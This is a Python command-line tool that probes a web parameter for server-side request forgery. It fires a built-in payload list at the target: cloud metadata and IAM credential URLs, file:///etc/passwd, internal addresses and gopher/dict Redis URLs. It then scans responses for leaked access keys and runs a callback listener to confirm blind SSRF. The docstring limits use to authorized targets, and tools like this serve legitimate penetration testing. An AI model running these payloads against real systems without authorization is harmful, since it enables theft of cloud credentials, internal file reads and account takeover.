"""Probe a request parameter for SSRF (server-side request forgery).

Injects a battery of SSRF payloads into a chosen parameter and analyzes the
responses for the tell-tales: cloud-metadata content (AWS/GCP/Azure credentials),
local file reads (file:///etc/passwd), and internal-service reachability (response
differs from a benign baseline). Optionally runs an out-of-band callback listener to
catch BLIND SSRF (the server connects back to you). SSRF is a top-tier bug —
metadata access often means full cloud takeover — and this makes the check fast and
thorough instead of hand-crafting each payload.

Mark the injection point with ``FUZZ`` in the URL, or name it with ``--param``.

Dependencies: standard library only. No external API.

Safety: sends requests to the TARGET with SSRF payloads (active, but no host writes).
Only test authorized targets. The callback listener binds a local port to observe
connections; it serves nothing.

Usage:
    python -m web.ssrf "https://target/fetch?url=FUZZ"
    python -m web.ssrf "https://target/api?image=FUZZ" --json
    python -m web.ssrf "https://target/fetch?url=FUZZ" --callback 203.0.113.5:9000
"""

from __future__ import annotations

import argparse
import http.server
import re
import socketserver
import sys
import threading
import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from common import http as httpc
from common.output import emit, log

# SSRF payloads: internal hosts, cloud metadata, alt schemes/encodings.
_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/", "http://127.0.0.1:22/",
    "http://127.1/", "http://[::1]/", "http://0177.0.0.1/", "http://2130706433/",  # decimal IP
    "http://169.254.169.254/latest/meta-data/",                                    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",                         # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",             # Azure
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "http://internal/", "http://10.0.0.1/", "http://192.168.0.1/", "http://172.17.0.1/",
    "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:6379/_INFO",
]

_INDICATORS = re.compile(
    r"(ami-id|instance-id|instance-identity|computeMetadata|iam/security-credentials|"
    r"AccessKeyId|SecretAccessKey|root:.*:0:0:|\[fonts\]|meta-data/|"
    r"redis_version|# Server|hostname=)", re.I)


def _inject(url: str, param: str, payload: str) -> str:
    if "FUZZ" in url:
        return url.replace("FUZZ", payload)
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    if param and param in q:
        q[param] = payload
    elif param:
        q[param] = payload
    else:
        return url
    return urlunparse(parts._replace(query=urlencode(q)))


class _Listener:
    """Tiny OOB listener: records any HTTP path it's hit on (blind-SSRF proof)."""
    def __init__(self, port: int):
        self.hits: list[str] = []
        outer = self

        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                outer.hits.append(self.path)
                self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
            def log_message(self, *a):
                pass
        self.httpd = socketserver.TCPServer(("0.0.0.0", port), H)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *a):
        self.httpd.shutdown()


def run(url: str, *, param: str = "", callback: str = "", timeout: float = 10.0) -> dict:
    """Probe ``url`` (with FUZZ or ``param``) for SSRF."""
    baseline = httpc.get(_inject(url, param, "http://example.com/"), timeout=timeout, retries=0)
    base_len, base_status = len(baseline.body), baseline.status

    payloads = list(_PAYLOADS)
    listener = None
    token_url = ""
    if callback:
        host, _, port = callback.partition(":")
        port = int(port or 80)
        token = f"ssrf{int(time.time())}"
        token_url = f"http://{callback}/{token}"
        payloads.append(token_url)

    findings = []
    log(f"[*] probing {len(payloads)} SSRF payloads ...")

    def probe(payload):
        r = httpc.get(_inject(url, param, payload), timeout=timeout, retries=0)
        body = r.text[:4000]
        ind = _INDICATORS.search(body)
        diff = abs(len(r.body) - base_len) > max(64, base_len // 5) or r.status != base_status
        if ind:
            return {"payload": payload, "signal": "metadata/file content leaked",
                    "level": "high", "evidence": ind.group(0), "status": r.status}
        if diff and r.status not in (400, 403, 404):
            return {"payload": payload, "signal": "response differs from baseline "
                    f"(status {r.status}, {len(r.body)}b vs {base_len}b) — internal reachable?",
                    "level": "medium", "evidence": "", "status": r.status}
        return None

    ctx = _Listener(int(callback.split(":")[1]) if callback and ":" in callback else 80) if callback else None
    try:
        if ctx:
            ctx.__enter__()
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            for r in pool.map(probe, payloads):
                if r:
                    findings.append(r)
        oob_hits = []
        if ctx:
            time.sleep(3)  # give blind callbacks a moment to arrive
            oob_hits = list(ctx.hits)
    finally:
        if ctx:
            ctx.__exit__()

    if callback and oob_hits:
        findings.insert(0, {"payload": token_url, "signal": "BLIND SSRF confirmed — server "
                            "connected back to the callback", "level": "high",
                            "evidence": ",".join(oob_hits[:5]), "status": 0})
    order = {"high": 0, "medium": 1}
    findings.sort(key=lambda f: order.get(f["level"], 2))
    return {"url": url, "param": param or ("FUZZ" if "FUZZ" in url else ""),
            "baseline": {"status": base_status, "length": base_len},
            "vulnerable": any(f["level"] == "high" for f in findings), "findings": findings}


def _compact_lines(res: dict) -> list[str]:
    lines = [f"# ssrf: {res['url']}  "
             f"{'VULNERABLE' if res['vulnerable'] else 'no strong signal'}",
             f"# baseline: status={res['baseline']['status']} len={res['baseline']['length']}"]
    lines.append("## FINDINGS")
    for f in res["findings"]:
        ev = f"  [{f['evidence']}]" if f["evidence"] else ""
        lines.append(f"[{f['level'].upper()}] {f['payload']}  -> {f['signal']}{ev}")
    if not res["findings"]:
        lines.append("(none — parameter may not be SSRF-able, or egress is filtered)")
    return lines


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="web.ssrf", description="Probe a parameter for SSRF (mark point with FUZZ or --param).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n  python -m web.ssrf \"https://t/fetch?url=FUZZ\"\n"
               "  python -m web.ssrf \"https://t/api?image=FUZZ\" --callback 203.0.113.5:9000\n")
    p.add_argument("url", nargs="?", help="Target URL with FUZZ marker (or use --param).")
    p.add_argument("--param", default="", help="Parameter name to inject if no FUZZ marker.")
    p.add_argument("--callback", default="", help="host:port of a reachable OOB listener (blind SSRF).")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--json", action="store_true")
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if not args.url or ("FUZZ" not in args.url and not args.param):
        build_parser().print_help(sys.stderr)
        return 2
    res = run(args.url, param=args.param, callback=args.callback, timeout=args.timeout)
    emit(res, as_json=args.json, lines=_compact_lines(res))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
